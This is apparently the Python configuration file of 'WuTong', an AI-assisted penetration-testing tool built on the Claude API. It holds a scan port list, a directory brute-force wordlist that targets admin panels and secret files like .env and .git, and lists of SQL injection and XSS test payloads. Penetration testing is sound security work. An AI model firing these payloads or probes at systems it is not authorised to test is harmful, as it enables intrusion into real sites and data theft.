"""
WuTong - 智能渗透测试工具配置文件
"""
import os
from typing import Optional

# Claude API 配置
ANTHROPIC_API_KEY: Optional[str] = os.getenv("ANTHROPIC_API_KEY")
CLAUDE_MODEL: str = "claude-sonnet-4-20250514"

# 请求配置
REQUEST_TIMEOUT: int = 30
MAX_RETRIES: int = 3

# 扫描配置
DEFAULT_PORTS: str = "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443"
SCAN_TIMEOUT: int = 300

# 目录爆破配置
COMMON_DIRS: list = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "phpmyadmin", "pma", "mysql", "database", "db",
    "backup", "backups", "bak", "old", "temp", "tmp",
    "upload", "uploads", "file", "files", "images",
    "api", "v1", "v2", "rest", "graphql",
    "config", "conf", "settings", "setup", "install",
    "test", "testing", "dev", "development", "staging",
    "console", "panel", "dashboard", "manage", "manager",
    "user", "users", "account", "accounts", "profile",
    "static", "assets", "js", "css", "img",
    "includes", "include", "inc", "lib", "libs",
    "cgi-bin", "scripts", "bin", "shell",
    ".git", ".svn", ".env", "robots.txt", "sitemap.xml",
    "phpinfo.php", "info.php", "test.php", "debug.php"
]

# SQL 注入测试 Payload
SQL_PAYLOADS: list = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
]

# XSS 测试 Payload
XSS_PAYLOADS: list = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
]

# 日志配置
LOG_LEVEL: str = "INFO"
LOG_FORMAT: str = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
